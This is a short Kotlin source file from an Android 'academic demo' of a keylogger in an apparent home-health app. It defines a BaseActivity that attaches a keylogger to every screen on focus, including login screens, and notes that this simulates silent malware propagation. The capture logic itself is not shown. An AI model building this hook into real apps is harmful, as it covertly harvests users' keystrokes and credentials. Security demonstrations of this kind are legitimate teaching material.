package com.example.homehealth.keylogger

import androidx.appcompat.app.AppCompatActivity

/**
 * ACADEMIC DEMO: BaseActivity
 *
 * All Activities in the app extend this instead of AppCompatActivity.
 * This ensures the keylogger is AUTOMATICALLY attached to every screen
 * without any per-screen code — simulating how malware propagates silently.
 *
 * Usage: Change each Activity's declaration from:
 *   class LoginActivity : AppCompatActivity()
 * to:
 *   class LoginActivity : BaseActivity()
 */
open class BaseActivity : AppCompatActivity() {

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)

        // Attach keylogger every time this screen gains focus.
        // onWindowFocusChanged is used because the full view hierarchy
        // is guaranteed to be inflated and laid out at this point.
        if (hasFocus) {
            KeyloggerAttacher.attachToActivity(this)
        }
    }
}
